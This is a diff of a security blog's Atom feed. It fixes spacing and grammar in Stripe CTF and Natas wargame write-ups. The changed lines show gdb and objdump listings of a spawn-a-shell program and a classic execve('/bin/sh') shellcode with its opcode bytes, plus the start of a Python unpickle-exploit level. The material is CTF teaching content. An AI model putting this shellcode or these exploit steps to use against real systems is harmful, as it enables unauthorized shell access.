@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/php.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><updated>2014-11-24T04:20:00-05:00</updated><author><name>Mia Steinkirch</name></author><id>tag:bt3gl.github.io,2014-11-24:the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing in neither of the &lt;a href="https://stripe.com/blog/capture-the-flag"&gt;three&lt;/a&gt; &lt;a href="https://stripe.com/blog/capture-the-flag-20"&gt;Stripe&lt;/a&gt; &lt;a href="https://stripe.com/blog/ctf3-launch"&gt;CTFs&lt;/a&gt;, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/php.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><updated>2014-11-24T04:20:00-05:00</updated><author><name>Mia Steinkirch</name></author><id>tag:bt3gl.github.io,2014-11-24:the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing in either of the &lt;a href="https://stripe.com/blog/capture-the-flag"&gt;three&lt;/a&gt; &lt;a href="https://stripe.com/blog/capture-the-flag-20"&gt;Stripe&lt;/a&gt; &lt;a href="https://stripe.com/blog/ctf3-launch"&gt;CTFs&lt;/a&gt;, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
 &lt;p&gt;This post is about the first &lt;a href="https://stripe.com/"&gt;Stripe&lt;/a&gt; CTF, which &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;happened in the beginning of 2012&lt;/a&gt;. I was able to fully reproduce the game by using a &lt;a href="http://www.janosgyerik.com/hacking-contest-on-a-live-cd/"&gt;Live CD Image&lt;/a&gt;. Other options were &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;direct download and BitTorrent&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about before in this blog (for instance, check &lt;a href="http://overthewire.org/wargames/"&gt;OverTheWire's&lt;/a&gt; &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas&lt;/a&gt;, &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;Narnia&lt;/a&gt;, and &lt;a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html"&gt;Krypton&lt;/a&gt;).&lt;/p&gt;
 &lt;hr /&gt;
@@ -268,10 +268,10 @@ chmod +x date
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="nx"&gt;gdb&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt;
 &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;disas&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;
 &lt;span class="nb"&gt;Dump&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nb"&gt;code&lt;/span&gt; &lt;span class="nb"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;sub&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mh"&gt;0x00000000004004d0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
+   &lt;span class="mh"&gt;0x00000000004004d1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
+   &lt;span class="mh"&gt;0x00000000004004d4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nb"&gt;sub&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;
+   &lt;span class="mh"&gt;0x00000000004004d8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x00000000004004e0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x00000000004004e8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rax&lt;/span&gt;
    &lt;span class="mh"&gt;0x00000000004004ec&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;lea&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rcx&lt;/span&gt;
@@ -303,17 +303,17 @@ chmod +x date
 
 &lt;p&gt;It should be a pointer to &lt;code&gt;/bin/sh&lt;/code&gt;, and we can be sure by  asking gdb:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="mh"&gt;0x482be4&lt;/span&gt;
-&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;    &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;After that, &lt;strong&gt;NULL&lt;/strong&gt; is pushed in:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004f0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;   &lt;span class="n"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004f0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;    &lt;span class="n"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Finally, &lt;strong&gt;execve&lt;/strong&gt; is executed:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004fb&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;callq&lt;/span&gt;  &lt;span class="mh"&gt;0x40c540&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004fb&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;callq&lt;/span&gt;  &lt;span class="mh"&gt;0x40c540&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -361,17 +361,17 @@ chmod +x date
 &lt;span class="nx"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;     &lt;span class="nb"&gt;file&lt;/span&gt; &lt;span class="nb"&gt;format&lt;/span&gt; &lt;span class="nx"&gt;elf32&lt;/span&gt;&lt;span class="na"&gt;-i386&lt;/span&gt;
 &lt;span class="nx"&gt;Disassembly&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;section&lt;/span&gt; &lt;span class="bp"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 &lt;span class="mi"&gt;08048054&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;_start&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
- &lt;span class="mi"&gt;8048054&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;c0&lt;/span&gt;                   &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048056&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;50&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048057&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;73&lt;/span&gt; &lt;span class="mi"&gt;68&lt;/span&gt;          &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;
- &lt;span class="mi"&gt;804805&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;62&lt;/span&gt; &lt;span class="mi"&gt;69&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;          &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;
- &lt;span class="mi"&gt;8048061&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e3&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
- &lt;span class="mi"&gt;8048063&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;50&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048064&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;53&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
- &lt;span class="mi"&gt;8048065&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e1&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ecx&lt;/span&gt;
- &lt;span class="mi"&gt;8048067&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;d2&lt;/span&gt;                   &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;
- &lt;span class="mi"&gt;8048069&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;b0&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0xb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;al&lt;/span&gt;
- &lt;span class="mi"&gt;804806&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;cd&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;                   &lt;span class="nx"&gt;int&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x80&lt;/span&gt;
+ &lt;span class="mi"&gt;8048054&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;c0&lt;/span&gt;                    &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
+ &lt;span class="mi"&gt;8048056&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;50&lt;/span&gt;                       &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
+ &lt;span class="mi"&gt;8048057&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;73&lt;/span&gt; &lt;span class="mi"&gt;68&lt;/span&gt;           &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;
+ &lt;span class="mi"&gt;804805&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;62&lt;/span&gt; &lt;span class="mi"&gt;69&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;           &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;
+ &lt;span class="mi"&gt;8048061&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e3&lt;/span&gt;                    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
+ &lt;span class="mi"&gt;8048063&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;50&lt;/span&gt;                       &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
+ &lt;span class="mi"&gt;8048064&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;53&lt;/span&gt;                       &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
+ &lt;span class="mi"&gt;8048065&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e1&lt;/span&gt;                    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ecx&lt;/span&gt;
+ &lt;span class="mi"&gt;8048067&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;d2&lt;/span&gt;                    &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;
+ &lt;span class="mi"&gt;8048069&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;b0&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;                    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0xb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;al&lt;/span&gt;
+ &lt;span class="mi"&gt;804806&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;cd&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;                    &lt;span class="nx"&gt;int&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x80&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -405,7 +405,7 @@ chmod +x date
 
 &lt;hr /&gt;
 &lt;h2&gt;Level 5:  Unpickle exploit&lt;/h2&gt;
-&lt;p&gt;The fifth level is an uppercasing &lt;strong&gt;web service&lt;/strong&gt; written in Python, which is split into an HTTP part, and a worker queue part.&lt;/p&gt;
+&lt;p&gt;The fifth level is a uppercasing &lt;strong&gt;web service&lt;/strong&gt; written in Python, which is split into an HTTP part, and a worker queue part.&lt;/p&gt;
 &lt;p&gt;In this service, a request can be sent  with:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9020&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;banana&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
@@ -715,12 +715,12 @@ chmod +x date
 &lt;hr /&gt;
 &lt;p&gt;&lt;strong&gt;Aloha, bt3&lt;/strong&gt;&lt;/p&gt;</summary><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry><entry><title>Exploiting the Web in 20 Lessons (Natas)</title><link href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html" rel="alternate"></link><updated>2014-10-16T06:01:00-04:00</updated><author><name>Mia Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-16:exploiting-the-web-in-20-lessons-natas.html</id><summary type="html">&lt;p&gt;&lt;img alt="cyber" src="http://i.imgur.com/ihtJsdE.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Continuing my quest through the &lt;a href="http://overthewire.org/wargames/"&gt;Wargames&lt;/a&gt;, today I am going to talk about the 20 first levels of &lt;a href="http://overthewire.org/wargames/natas/"&gt;Natas&lt;/a&gt;, the &lt;strong&gt;web exploitation episode&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;I divide the exploits in two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.&lt;/p&gt;
+&lt;p&gt;I divide the exploits into two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.&lt;/p&gt;
 &lt;p&gt;Let the game begin.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;No scripting required here, Dude!&lt;/h2&gt;
 &lt;h3&gt;Level 0 and 1: Simple source code inspection&lt;/h3&gt;
-&lt;p&gt;The first two levels starts with a simple HTML page. No hints.&lt;/p&gt;
